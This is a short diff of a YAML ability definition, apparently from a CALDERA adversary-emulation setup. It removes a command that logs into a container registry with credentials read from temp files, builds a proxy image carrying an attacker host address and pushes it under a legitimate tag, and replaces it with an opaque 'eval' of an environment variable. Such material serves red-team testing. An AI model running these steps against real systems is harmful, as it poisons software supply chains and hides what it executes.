@@ -6,4 +6,4 @@
   repeatable: false
   singleton: true
   platforms:
-    linux: { sh: { command: "sleep $W611 && docker login $HOSTREGISTRY -u $(cat /tmp/user) -p $(cat /tmp/pass) && docker build --build-arg CALDERA_HOST=$ATTACKERADDR -f /utils/proxy/Dockerfile -t $HOSTREGISTRY/frontend-proxy:2.0.2 /utils/proxy && docker push $HOSTREGISTRY/frontend-proxy:2.0.2", timeout: 900 } }
+    linux: { sh: { command: "eval $KC0611", timeout: 900 } }
